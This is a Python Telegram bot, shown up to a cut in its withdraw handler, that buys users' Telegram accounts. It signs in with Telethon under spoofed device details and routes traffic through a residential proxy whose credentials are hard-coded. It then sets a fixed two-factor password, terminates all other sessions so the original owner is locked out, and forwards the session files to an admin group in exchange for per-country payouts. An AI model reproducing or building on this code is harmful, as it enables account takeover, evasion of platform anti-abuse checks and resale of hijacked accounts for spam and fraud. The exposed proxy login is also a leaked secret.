import telebot
import sqlite3
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PeerFloodError
from telethon.tl import functions
import asyncio
import threading
import os
import phonenumbers
from phonenumbers import geocoder, country_code_for_region
import pycountry
from telebot import types
from telebot.util import escape
import time
import re
import datetime
import secrets
import string
import random
from collections import Counter
import zipfile
import shutil
import logging
import requests

# Configuration
API_TOKEN = "আপনার বট টোকেন দিন "
ADMIN_ID = 123456789  # এডমিন আইডি দিন
API_ID = 1234567  # API_ID
API_HASH = "your_api_hash_here"  # API_HASH
SESSION_GROUP_ID = -1002845725805
WITHDRAW_GROUP_ID = -1002741068000
CHANNEL_URL = "https://t.me/tx_receivers_news"
CHANNEL_USERNAME = "@tx_receivers_news"
SPAM_BOT = "@SpamBot"

MIN_WITHDRAW = 2.0
DB_FILE = "session_bot.db"

USD_TO_TRX = 10.0
USD_TO_BDT = 117.0
USD_TO_PKR = 278.0

SESSIONS_FOLDER = "sessions"

if not os.path.exists(SESSIONS_FOLDER):
    os.makedirs(SESSIONS_FOLDER)

# Logging configuration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Country-specific proxies
proxies = {
    "BD": None,
    "SA": None,
    "IN": None,
    "US": None,
    "TG": {
        "proxy_type": "socks5",
        "addr": "93.190.141.105",
        "port": 9999,
        "username": "mmk5faqpdh-corp.mobile.res-country-TG-state-3653224-city-3652462-hold-query",
        "password": "vTFdOUgHfFeHFHA8"
    }
}

# Helper function for fixed password
def generate_random_password():
    return "@Riyad12"

# Generate random device info
def generate_random_device_info():
    device_models = ["iPhone 14", "Samsung Galaxy S21", "Google Pixel 6", "Xiaomi 12", "OnePlus 9"]
    system_versions = ["iOS 16.5", "Android 13", "iOS 15.7", "Android 12", "iOS 17.0"]
    return {
        "device_model": random.choice(device_models),
        "system_version": random.choice(system_versions),
        "app_version": "10.5.5 (2950)",
        "lang_code": "en"
    }

def init_db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    # Create all tables with all columns
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            full_name TEXT,
            balance REAL DEFAULT 0,
            session_count INTEGER DEFAULT 0,
            verified_count INTEGER DEFAULT 0,
            unverified_count INTEGER DEFAULT 0,
            claimed_numbers TEXT DEFAULT "",
            pending_numbers TEXT DEFAULT "",
            join_date TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS country_rates (
            country_code TEXT PRIMARY KEY,
            rate REAL NOT NULL,
            claim_time_seconds INTEGER NOT NULL,
            status TEXT NOT NULL DEFAULT "on",
            capacity INTEGER NOT NULL DEFAULT 10,
            usage_count INTEGER NOT NULL DEFAULT 0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS used_numbers (
            phone_number TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS withdraw_history (
            withdraw_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            amount REAL NOT NULL,
            address TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            trans_no TEXT,
            transaction_id TEXT,
            currency TEXT
        )
    """)
    cursor.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    cursor.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    
    # Insert default data
    cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (ADMIN_ID,))
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_status', 'on')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_password', '@Riyad12')")
    
    # Insert default country rates if table is empty
    if cursor.execute("SELECT COUNT(*) FROM country_rates").fetchone()[0] == 0:
        default_rates = [
            ("BD", 10.0, 30, "on", 20, 0),
            ("SA", 20.0, 60, "on", 15, 0),
            ("IN", 8.0, 20, "on", 25, 0),
            ("US", 25.0, 45, "on", 10, 0),
            ("TG", 15.0, 40, "on", 15, 0)
        ]
        cursor.executemany("INSERT INTO country_rates VALUES (?, ?, ?, ?, ?, ?)", default_rates)
    
    conn.commit()
    conn.close()
    logging.info("Database initialized successfully")

# Safe migration function
def migrate_db():
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        # Check if users table exists
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users'")
        if not cursor.fetchone():
            logging.warning("Users table doesn't exist. Running full initialization instead.")
            conn.close()
            init_db()
            return
            
        # Check and add missing columns to users table
        cursor.execute("PRAGMA table_info(users)")
        columns = [info[1] for info in cursor.fetchall()]
        
        if 'verified_count' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN verified_count INTEGER DEFAULT 0")
            logging.info("Added verified_count column to users table")
            
        if 'unverified_count' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN unverified_count INTEGER DEFAULT 0")
            logging.info("Added unverified_count column to users table")
            
        if 'pending_numbers' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN pending_numbers TEXT DEFAULT ''")
            logging.info("Added pending_numbers column to users table")
        
        # Check and add missing columns to withdraw_history table
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='withdraw_history'")
        if cursor.fetchone():
            cursor.execute("PRAGMA table_info(withdraw_history)")
            columns = [info[1] for info in cursor.fetchall()]
            column_names = [col[1] for col in columns]
            
            if 'trans_no' not in column_names:
                cursor.execute("ALTER TABLE withdraw_history ADD COLUMN trans_no TEXT")
                logging.info("Added trans_no column to withdraw_history table")
                
            if 'transaction_id' not in column_names:
                cursor.execute("ALTER TABLE withdraw_history ADD COLUMN transaction_id TEXT")
                logging.info("Added transaction_id column to withdraw_history table")
                
            if 'currency' not in column_names:
                cursor.execute("ALTER TABLE withdraw_history ADD COLUMN currency TEXT")
                logging.info("Added currency column to withdraw_history table")
        
        conn.commit()
        conn.close()
        logging.info("Database migration completed successfully")
        
    except Exception as e:
        logging.error(f"Migration error: {e}")
        # If migration fails, reinitialize database
        init_db()

# Initialize database
init_db()
# Run migration after initialization
migrate_db()

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

# Admin Check Function
def is_admin(user_id):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
    is_admin_user = cursor.fetchone()
    conn.close()
    return is_admin_user is not None

# Channel join check
def send_join_channel_message(chat_id):
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("Join Our Channel", url=CHANNEL_URL)
    markup.add(join_button)
    text = ("🎉 Welcome to Our Session Management System\n\n"
            "🧑‍💻 Please maintain professional conduct while using our services 🚀\n\n"
            "To access all features, please join our official channel. After joining, send /start again.")
    try:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Error sending join message to {chat_id}: {e}")

def channel_join_required(func):
    def wrapper(message):
        if is_admin(message.from_user.id):
            func(message)
            return
        try:
            member = bot.get_chat_member(CHANNEL_USERNAME, message.from_user.id)
            if member.status in ["member", "administrator", "creator"]:
                func(message)
            else:
                send_join_channel_message(message.chat.id)
        except telebot.apihelper.ApiTelegramException as e:
            if "user not found" in str(e).lower():
                send_join_channel_message(message.chat.id)
            else:
                logging.error(f"Channel join check error: {e}")
                bot.reply_to(message, "Error verifying channel membership. Please try again later.")
    return wrapper

def check_bot_permissions():
    try:
        bot.get_chat(SESSION_GROUP_ID)
        logging.info("✅ Connected to Session Group.")
        bot.get_chat(WITHDRAW_GROUP_ID)
        logging.info("✅ Connected to Withdraw Group.")
        bot.get_chat(CHANNEL_USERNAME)
        logging.info(f"✅ Connected to Channel: {CHANNEL_USERNAME}")
        return True
    except Exception as e:
        logging.error(f"❌ CRITICAL ERROR: Could not connect to a required chat. Error: {e}")
        return False

def get_country_info(phone_number):
    try:
        parsed_number = phonenumbers.parse(phone_number)
        country_code = geocoder.region_code_for_number(parsed_number)
        dial_code = parsed_number.country_code
        return {"code": country_code, "dial_code": dial_code}
    except:
        return {"code": None, "dial_code": None}

def run_telethon_task(task, *args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(task(*args))
    finally:
        loop.close()

async def check_spam_status(client, phone, chat_id, processing_msg_id):
    try:
        await client.send_message(SPAM_BOT, "/start")
        await asyncio.sleep(2)
        messages = await client.get_messages(SPAM_BOT, limit=1)
        if messages and "Unfortunately, some actions can trigger a harsh response from our anti-spam systems" in messages[0].text:
            return True
        return False
    except Exception as e:
        logging.error(f"Error checking spam status for {phone}: {e}")
        bot.edit_message_text(f"⚠️ Error checking spam status for {phone}. Please try again.", chat_id, processing_msg_id)
        return False

async def send_login_code(chat_id, phone_number, message_id):
    try:
        country_info = get_country_info(phone_number)
        country_code = country_info["code"]
        proxy = proxies.get(country_code)
        device_info = generate_random_device_info()

        session_filename = f"{chat_id}{phone_number}.session"
        client = TelegramClient(session_filename, API_ID, API_HASH, proxy=proxy, device_model=device_info["device_model"], system_version=device_info["system_version"], app_version=device_info["app_version"], lang_code=device_info["lang_code"])
        await client.connect()
        sent_code_info = await client.send_code_request(phone_number)
        user_data[chat_id] = {"phone_code_hash": sent_code_info.phone_code_hash, "session_filename": session_filename, "phone": phone_number, "state": "awaiting_code"}
        
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        new_pending_str = f"{pending_str},{phone_number}" if pending_str else phone_number
        cursor.execute("UPDATE users SET pending_numbers = ?, unverified_count = unverified_count + 1 WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        conn.close()

        flag = "".join(chr(ord(c) + 127397) for c in country_code.upper()) if country_code else "🌍"
        msg_text = f"{flag} Verification code has been sent to: {phone_number}\n\nPlease enter the 5-digit code you received.\n\n/cancel to cancel operation"
        sent_msg = bot.edit_message_text(msg_text, chat_id, message_id, parse_mode="Markdown")
        user_data[chat_id]["code_msg_id"] = sent_msg.message_id
    except Exception as e:
        bot.edit_message_text(f"❌ Error sending verification code: {e}\n\nPlease try again.", chat_id, message_id)
        if chat_id in user_data: 
            del user_data[chat_id]

async def _generate_session_file(chat_id, phone, code, phone_code_hash, session_filename, processing_msg_id):
    country_info = get_country_info(phone)
    country_code = country_info["code"]
    proxy = proxies.get(country_code)
    device_info = generate_random_device_info()

    client = TelegramClient(session_filename, API_ID, API_HASH, proxy=proxy, device_model=device_info["device_model"], system_version=device_info["system_version"], app_version=device_info["app_version"], lang_code=device_info["lang_code"])
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    try:
        logging.info(f"[LOG for {chat_id}]: Connecting Telethon client for {phone}...")
        await client.connect()
        logging.info(f"[LOG for {chat_id}]: Client connected. Attempting to sign in...")
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        logging.info(f"[LOG for {chat_id}]: Sign in successful!")

        # Spam check with @SpamBot
        is_spam = await check_spam_status(client, phone, chat_id, processing_msg_id)
        if is_spam:
            logging.error(f"[ERROR for {chat_id}]: Account {phone} is marked as spam by @SpamBot.")
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone in pending_numbers:
                pending_numbers.remove(phone)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
            conn.commit()
            bot.edit_message_text(f"❌ Account {phone} is marked as spam. Only fresh accounts are accepted.", chat_id, processing_msg_id, parse_mode="Markdown")
            return

        # Check for restrictions
        me = await client.get_me()
        if me.restricted:
            raise Exception(f"Account is restricted: {me.restriction_reason}")

        cursor.execute("SELECT value FROM settings WHERE key = '2fa_status'")
        twofa_status_tuple = cursor.fetchone()
        twofa_status = twofa_status_tuple[0] if twofa_status_tuple else "on"

        cursor.execute("SELECT value FROM settings WHERE key = '2fa_password'")
        twofa_password_tuple = cursor.fetchone()
        new_password = twofa_password_tuple[0] if twofa_password_tuple else "@Riyad12"

        if twofa_status == "on":
            try:
                logging.info(f"[LOG for {chat_id}]: Attempting to set 2FA...")
                await client.edit_2fa(new_password=new_password, hint="Set by Session Manager")
                logging.info(f"[LOG for {chat_id}]: 2FA set successfully with password: {new_password}")
            except Exception as e:
                logging.error(f"[ERROR for {chat_id}]: Could not set 2FA for {phone}. Reason: {e}")
                bot.send_message(ADMIN_ID, f"⚠️ 2FA Setup Failed!\nPhone: `{phone}`\nReason: {e}", parse_mode="Markdown")
                new_password = None

        rate_info = None
        if country_code:
            cursor.execute("SELECT rate, claim_time_seconds FROM country_rates WHERE country_code = ? AND status = 'on'", (country_code,))
            rate_info = cursor.fetchone()

        if rate_info:
            rate, claim_time = rate_info
            flag = "".join(chr(ord(c) + 127397) for c in country_code.upper()) if country_code else "🌍"
            initial_message_text = f"{flag} Account {phone} has been successfully registered and is pending confirmation.\n\n⏳ Confirmation Time: {claim_time} seconds\n\n⚠️ Important: Please ensure you are logged out of this account on all other devices for a smooth confirmation process."
            markup = types.InlineKeyboardMarkup()
            dummy_button = types.InlineKeyboardButton("⏳ Awaiting Confirmation...", callback_data="wait")
            markup.add(dummy_button)
            sent_message = bot.edit_message_text(initial_message_text, chat_id, processing_msg_id, parse_mode="Markdown", reply_markup=markup)

            logging.info(f"[LOG for {chat_id}]: Starting auto-claim timer for {claim_time} seconds.")
            timer_thread = threading.Timer(claim_time, run_telethon_task, args=[auto_claim_balance, chat_id, phone, sent_message.message_id, session_filename])
            timer_thread.start()
        else:
            bot.edit_message_text(f"✅ Account `{phone}` received successfully! No auto-claim rate configured for this country.", chat_id, processing_msg_id, parse_mode="Markdown")

        admin_caption = f"🔔 New Session Created\nUser ID: {chat_id}\nPhone: `{phone}`"
        if new_password: 
            admin_caption += f"\n🔐 2FA Password: `{new_password}`"
        else: 
            admin_caption += "\n⚠️ 2FA setup failed!"
        with open(session_filename, "rb") as sf:
            bot.send_document(SESSION_GROUP_ID, sf, caption=admin_caption, parse_mode="Markdown", visible_file_name=f"{phone}.session")

        saved_session_path = os.path.join(SESSIONS_FOLDER, f"{phone}.session")
        shutil.copy(session_filename, saved_session_path)

    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        logging.error(f"[ERROR for {chat_id}]: Invalid or expired code for {phone}.")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text("⚠️ Invalid or expired verification code. Use /cancel and try again.", chat_id, processing_msg_id, parse_mode="Markdown")
        user_data[chat_id]["state"] = "awaiting_code"
    except SessionPasswordNeededError:
        logging.error(f"[ERROR for {chat_id}]: Account {phone} has 2FA enabled.")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text("❌ Account rejected. 2FA is enabled. Please disable it and use /start again.", chat_id, processing_msg_id, parse_mode="Markdown")
    except FloodWaitError as e:
        logging.error(f"[ERROR for {chat_id}]: Flood wait error for {phone}: {e}")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text("❌ Account is temporarily restricted. Cannot accept this account at this time.", chat_id, processing_msg_id, parse_mode="Markdown")
    except PeerFloodError as e:
        logging.error(f"[ERROR for {chat_id}]: Peer flood error for {phone}: {e}")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text("❌ Account has spam restrictions. Cannot accept this account.", chat_id, processing_msg_id, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"[CRITICAL ERROR for {chat_id}]: Login Error for {phone}: {e}")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text(f"❌ Authentication Error: {e}\n\nThis may be due to network issues or account restrictions. Please try again later or use a different account.", chat_id, processing_msg_id, parse_mode="Markdown")
    finally:
        conn.close()
        if client.is_connected():
            await client.disconnect()
        if chat_id in user_data and user_data.get(chat_id, {}).get("state") != "awaiting_code":
            if chat_id in user_data:
                del user_data[chat_id]

async def auto_claim_balance(user_id, phone_number, message_id, session_filename):
    country_info = get_country_info(phone_number)
    country_code = country_info["code"]
    proxy = proxies.get(country_code)
    device_info = generate_random_device_info()

    client = TelegramClient(session_filename, API_ID, API_HASH, proxy=proxy, device_model=device_info["device_model"], system_version=device_info["system_version"], app_version=device_info["app_version"], lang_code=device_info["lang_code"])
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    try:
        await client.connect()
        if not await client.is_user_authorized():
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone_number in pending_numbers:
                pending_numbers.remove(phone_number)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
            conn.commit()
            final_message = f"❗️ Account {phone_number} is not accessible. Please ensure you have logged out from all other devices."
            bot.edit_message_text(final_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)
            return

        sessions = await client(functions.account.GetAuthorizationsRequest())
        other_devices = 0
        for auth in sessions.authorizations:
            if auth.hash != 0:
                await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                other_devices += 1

        if other_devices > 0:
            logging.info(f"Terminated {other_devices} other device session(s) for {phone_number}")

        sessions = await client(functions.account.GetAuthorizationsRequest())
        if len(sessions.authorizations) > 1:
            other_devices = len(sessions.authorizations) - 1
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone_number in pending_numbers:
                pending_numbers.remove(phone_number)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
            conn.commit()
            final_message = f"❗️ Balance claim failed. **{other_devices} other device(s)** remain active after termination attempt."
            bot.edit_message_text(final_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)
            return

        cursor.execute("SELECT claimed_numbers FROM users WHERE user_id = ?", (user_id,))
        claimed_str_tuple = cursor.fetchone()
        claimed_str = claimed_str_tuple[0] if claimed_str_tuple else ""
        if phone_number in claimed_str.split(","): 
            return

        if not country_code: 
            return

        cursor.execute("SELECT rate FROM country_rates WHERE country_code = ?", (country_code,))
        rate_info = cursor.fetchone()
        if not rate_info: 
            return

        amount_to_add = rate_info[0]
        new_claimed_str = f"{claimed_str},{phone_number}"
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone_number in pending_numbers:
            pending_numbers.remove(phone_number)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET balance = balance + ?, claimed_numbers = ?, session_count = session_count + 1, verified_count = verified_count + 1, unverified_count = unverified_count - 1, pending_numbers = ? WHERE user_id = ?", (amount_to_add, new_claimed_str, new_pending_str, user_id))
        else:
            cursor.execute("UPDATE users SET balance = balance + ?, claimed_numbers = ?, session_count = session_count + 1, verified_count = verified_count + 1 WHERE user_id = ?", (amount_to_add, new_claimed_str, user_id))

        cursor.execute("UPDATE country_rates SET usage_count = usage_count + 1 WHERE country_code = ?", (country_code,))

        cursor.execute("SELECT usage_count, capacity FROM country_rates WHERE country_code = ?", (country_code,))
        usage_capacity_tuple = cursor.fetchone()
        if usage_capacity_tuple:
            usage, capacity = usage_capacity_tuple
            if usage >= capacity:
                cursor.execute("UPDATE country_rates SET status = 'off' WHERE country_code = ?", (country_code,))
                bot.send_message(ADMIN_ID, f"ℹ️ Capacity limit reached for `{country_code}`. Service has been automatically disabled.", parse_mode="Markdown")

        cursor.execute("INSERT OR IGNORE INTO used_numbers (phone_number, user_id) VALUES (?, ?)", (phone_number, user_id))
        conn.commit()

        flag = "".join(chr(ord(c) + 127397) for c in country_code.upper()) if country_code else "🌍"
        final_message = (f"🎉 Account Successfully Processed\n"
                        f"Phone Number: {phone_number}\n"
                        f"Credit Amount: ${amount_to_add:.2f}\n"
                        f"Status: Verified\n"
                        f"Congratulations! ${amount_to_add:.2f} has been added to your balance.")
        bot.edit_message_text(final_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)

    except Exception as e:
        logging.error(f"Auto-claim failed for {user_id}: {e}")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone_number in pending_numbers:
            pending_numbers.remove(phone_number)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
        conn.commit()
        error_message = (f"❗️ Balance claim failed for `{phone_number}`.\n\n"
                        f"**Reason:** `{e}`\n\n"
                        f"This is typically a temporary network issue. Your balance was not credited. Please contact support if this issue persists.")
        bot.edit_message_text(error_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)
    finally:
        conn.close()
        if client.is_connected():
            await client.disconnect()

def is_session_active(session_path):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        device_info = generate_random_device_info()
        client = TelegramClient(session_path, API_ID, API_HASH, device_model=device_info["device_model"], system_version=device_info["system_version"], app_version=device_info["app_version"], lang_code=device_info["lang_code"])
        loop.run_until_complete(client.connect())
        authorized = loop.run_until_complete(client.is_user_authorized())
        loop.run_until_complete(client.disconnect())
        return authorized
    except Exception as e:
        logging.error(f"Error checking session {session_path}: {e}")
        return False
    finally:
        loop.close()

def count_session_files():
    active_count = 0
    invalid_count = 0
    for filename in os.listdir(SESSIONS_FOLDER):
        if filename.endswith(".session"):
            session_path = os.path.join(SESSIONS_FOLDER, filename)
            if is_session_active(session_path):
                active_count += 1
            else:
                invalid_count += 1
    return active_count, invalid_count

# Generate random transaction number and ID
def generate_trans_no():
    return "TC" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=9))

def generate_transaction_id():
    return ''.join(random.choices(string.hexdigits.lower(), k=12))

# Helper functions for /capacity command
def _flag_from_country(code):
    try:
        return "".join(chr(ord(c) + 127397) for c in code.upper())
    except:
        return "🌍"

def _format_quote_line(code, rate, claim_time):
    try:
        dial = country_code_for_region(code)
    except:
        dial = ""
    flag = _flag_from_country(code)
    return f"{flag} +{dial} | 💰 ${rate:.2f} | ⏰ {claim_time}s"

# Telegram bot handlers (General users)
@bot.message_handler(commands=["start"])
def command_start(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, full_name, join_date) VALUES (?, ?, ?)", (message.from_user.id, message.from_user.first_name, time.strftime("%Y-%m-%d")))
    conn.commit()
    conn.close()
    channel_join_required(send_welcome)(message)

def send_welcome(message):
    welcome_text = ("🎉 Welcome to the Session Management System\n\n"
                    "Please provide your phone number starting with the country code.\n"
                    "Example: +228xxxxxxxx for Togo\n\n"
                    "Available Commands:\n"
                    "/capacity - View available countries and rates\n"
                    "/account - Check your account status\n"
                    "/withdraw - Initiate withdrawal process\n"
                    "/withdrawhistory - View withdrawal history\n"
                    "/help - Detailed usage guide\n"
                    "/cancel - Cancel current operation")
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=["help"])
@channel_join_required
def command_help(message):
    help_text = ("📖 **Session Management System - Usage Guide**\n\n"
                "**Getting Started:**\n"
                "• Send your phone number with country code (e.g., +1234567890)\n"
                "• You will receive a verification code via Telegram\n"
                "• Enter the 5-digit code to complete authentication\n\n"
                "**Available Commands:**\n"
                "• /start - Initialize the system\n"
                "• /capacity - View country availability and rates\n"
                "• /account - Check your balance and session count\n"
                "• /withdraw - Withdraw your earnings\n"
                "• /withdrawhistory - View withdrawal records\n"
                "• /cancel - Cancel current operation\n\n"
                "**Withdrawal Information:**\n"
                f"• Minimum withdrawal: ${MIN_WITHDRAW:.2f}\n"
                "• Supported methods: LD Card, USDT (BP20)\n"
                "• Processing time: 24-48 hours\n\n"
                "**Important Notes:**\n"
                "• Ensure you logout from other devices before verification\n"
                "• Only fresh accounts are accepted\n"
                "• Follow our channel for updates and announcements")
    
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=["capacity"])
@channel_join_required
def command_capacity(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT country_code, rate, claim_time_seconds
        FROM country_rates
        WHERE status = 'on'
        ORDER BY country_code
    """)
    rows = cursor.fetchall()
    conn.close()

    if not rows:
        bot.send_message(message.chat.id, "Currently no countries are available for service. Please check back later.")
        return

    message_text = "🌍 **Available Countries & Rates**\n\n"
    for code, rate, claim_time in rows:
        try:
            line = _format_quote_line(code, rate, claim_time)
            message_text += f"{line}\n"
        except Exception as e:
            logging.error(f"/capacity format failed for {code}: {e}")
            continue

    message_text += f"\n📊 Total Available Countries: {len(rows)}"

    try:
        bot.send_message(
            message.chat.id,
            message_text,
            parse_mode="Markdown",
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"/capacity send failed: {e}")
        bot.send_message(message.chat.id, "⚠️ Unable to display country list. Please try again later.")

@bot.message_handler(commands=["account"])
@channel_join_required
def command_account(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance, verified_count, pending_numbers FROM users WHERE user_id = ?", (message.from_user.id,))
    user_info = cursor.fetchone()
    conn.close()
    if user_info:
        balance, verified_count, pending_numbers = user_info
        pending_count = len([n for n in pending_numbers.split(",") if n]) if pending_numbers else 0
        now = datetime.datetime.now()
        profile_text = ("📊 **Account Overview**\n\n"
                        "🆔 **User ID:** {}\n\n"
                        "✅ **Verified Accounts:** {}\n"
                        "⏳ **Pending Verification:** {}\n"
                        "💰 **Available Balance:** ${:.2f}\n\n"
                        "📅 **Date:** {}\n"
                        "⏰ **Time:** {}\n\n"
                        "View your withdrawal history using:\n"
                        "`/withdrawhistory`").format(
                            message.from_user.id, 
                            verified_count, 
                            pending_count, 
                            balance, 
                            now.strftime("%d/%m/%Y"), 
                            now.strftime("%I:%M %p")
                        )
        bot.send_message(message.chat.id, profile_text, parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "Account not found. Please use /start to initialize your account.")

@bot.message_handler(commands=["withdraw"])
@channel_join_required
def command_withdraw(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (message.from_user.id,))
    balance_res = cursor.fetchone()
    conn.close()
    balance = balance_res[0] if balance_res else 0.0
    if balance < MIN_WITHDRAW:
